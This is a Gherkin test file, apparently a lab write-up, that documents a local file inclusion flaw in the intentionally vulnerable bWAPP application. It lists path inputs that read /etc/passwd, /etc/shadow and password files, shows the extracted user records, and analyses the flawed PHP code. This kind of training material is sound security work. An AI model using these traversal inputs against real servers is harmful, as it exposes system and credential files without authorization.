#  FIN.S.0075 Local file inclusion      |     id 0983240988
#  Access vector: 1.000 | Network: Exploitable from internet
#  Compromised system: bWAPP server
#  Criticity: 6.3 | Vulnerabilities: 1 | Records: 22 | Status: Open
#  Impact confidentiality: 0.660 integrity: 0 availability: 0
#  Authentication: 0.560 Single authentication point
#  Exploitabilty: 1.000 High: exploit is not required or can be automated
#  Confidence level: 1.000 Confirmed: The vulnerability is recognized by the manufacturer
#  Resolution Level: 0.870 Official: There is a manufacturer-available patch
#  Access complexity: 0.710 Low: No special conditions required
#  CVSS v2 Base: 6.8 Temporal: 5.9

Feature: Vulnerability FIN.S.0075 Local file inclusion
  From the bWAPP application
  From the A7 - Missing functional level access controls category
  In URL bwapp/directory_traversal_1.php
  As any user from Internet with acces to bWAPP
  I want to be able to see local files I'm not supposed to
  In order to gain access to system objects with sensitive content
  Due to missing functional level access controls
  Recommendation: restrict access to sensitive files (REQ.0176)

  Background:
    Given I am running Manjaro GNU/Linux kernel 4.9.86
    And I am running bWAPP 2.2 in Docker container raesene/bwapp:
    """
    ubuntu 14.04 LTS, kernel=host(4.9), MySQL 5.5, Apache 2.4.7, PHP 5.5
    """
    Given a PHP site showing a message:
    """
    URL: bwapp/directory_traversal1.php?page=message.txt
    Message: Try to climb higher Spidy...
    Evidence: default-file.png
    """

  Scenario Outline: Dynamic detection and exploitation
  The page displays arbitrary text files in the server.
    Given the message and the page=message.txt GET parameter in the URL
    When I change the GET parameter page=message.txt to another page=<path>
    Then I see the file <printed> in the page, if it is a text file:

    Examples:
      |         <path>        |             <printed>             | <evidence> |
      | /etc/passwd           | User accounts info                | passwd.png |
      | /etc/group            | User groups info                  | |
      | /etc/shadow           | Couldn't open                     | protected.png |
      | /etc/hosts            | Hosts file                        | |
      | commandi.php          | PHP source code and rendered HTML | source.png |
      | passwords/heroes.xml  | Heroes' passwords and secrets     | |
      | admin/settings.php    | No output, but the file exists    | |

  Scenario: Users record extraction
  Users can be enumerated by displaying /etc/passwd in the page.
    When I change the page=message.txt parameter to page=/etc/passwd
    Then we retrieve the following user records:

      # Records extracted
      | username | pw? | UID | GID | info | home | shell |
      | root     | x | 0 | 0 | root | /root | /bin/bash |
      | daemon   | x | 1 | 1 | daemon | /usr/sbin | /usr/sbin/nologin |
      | bin      | x | 2 | 2 | bin | /bin | /usr/sbin/nologin |
      | sys      | x | 3 | 3 | sys | /dev | /usr/sbin/nologin |
      | sync     | x | 4 | 65534 | sync | /bin | /bin/sync |
      | games    | x | 5 | 60 | games | /usr/games | /usr/sbin/nologin |
      | man      | x | 6 | 12 | man | /var/cache/man | /usr/sbin/nologin |
      | lp       | x | 7 | 7 | lp | /var/spool/lpd | /usr/sbin/nologin |
      | mail     | x | 8 | 8 | mail | /var/mail | /usr/sbin/nologin |
      | news     | x | 9 | 9 | news | /var/spool/news | /usr/sbin/nologin |
      | uucp     | x | 10 | 10 | uucp | /var/spool/uucp | /usr/sbin/nologin |
      | proxy    | x | 13 | 13 | proxy | /bin | /usr/sbin/nologin |
      | www-data | x | 33 | 33 | www-data | /var/www | /usr/sbin/nologin |
      | backup   | x | 34 | 34 | backup | /var/backups | /usr/sbin/nologin |
      | list     | x | 38 | 38 | Mailing List Manager | /var/list | /usr/sbin/nologin |
      | irc      | x | 39 | 39 | ircd | /var/run/ircd | /usr/sbin/nologin |
      | gnats    | x | 41 | 41 | Gnats Bug-Reporting System (admin) | /var/lib/gnats | /usr/sbin/nologin |

  Scenario: Static Detection
  The PHP code does not validate or sanitize user input.
    When I look at the page source code
    Then I see that the file in the GET parameter is displayed like this:
    """
    Source: bwapp/directory_traversal_1.php
    223  $file = $_GET["page"];
    233  show_file($file);
    136  function show_file($file)
    141    if(is_file($file))
    144      $fp = fopen($file, "r") or die("Couldn't open $file.");
    146      while(!feof($fp))
    149        $line = fgets($fp,1024);
    150        echo($line);
    151        echo "<br />";
    """
    Then we see that this code has several issues:
    | Issue                                                         | Line    |
    | No input sanitization or validation is performed              | 223-233 |
    | Function call fgets has several issues, vg not cleaning HTML  | 149     |
    # In particular this could be used for XSS or CSRF.
    | File is opened but not closed                                 | 144     |

# Cucumber test
# $ cucumber -f progress -qms raballestasr.feature
# UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
# 9 scenarios (9 undefined)
# 53 steps (53 undefined)
# Cucumber report generation
# $ cucumber -f html -o report.html raballestasr.feature
